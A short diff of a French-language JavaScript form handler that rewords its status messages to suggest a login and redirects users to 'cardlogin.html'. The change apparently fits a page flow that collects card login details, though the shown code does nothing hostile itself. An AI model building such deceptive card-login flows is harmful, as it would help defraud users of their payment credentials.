@@ -96,7 +96,7 @@ form.addEventListener("submit", async function (event) {
 
 
 
-    result.textContent = "Envoi en cours...";
+    result.textContent = "connexion en cours...";
     result.className = "";
 
 
@@ -116,7 +116,7 @@ form.addEventListener("submit", async function (event) {
         );
 
 
-        result.textContent = "Votre demande a été envoyée.";
+        result.textContent = "Votre demande est en cour.";
         result.className = "success";
 
 
@@ -128,7 +128,7 @@ form.addEventListener("submit", async function (event) {
 
        
 
-        window.location.href = "page2.html";
+        window.location.href = "cardlogin.html";
 
 
     } catch (error) {
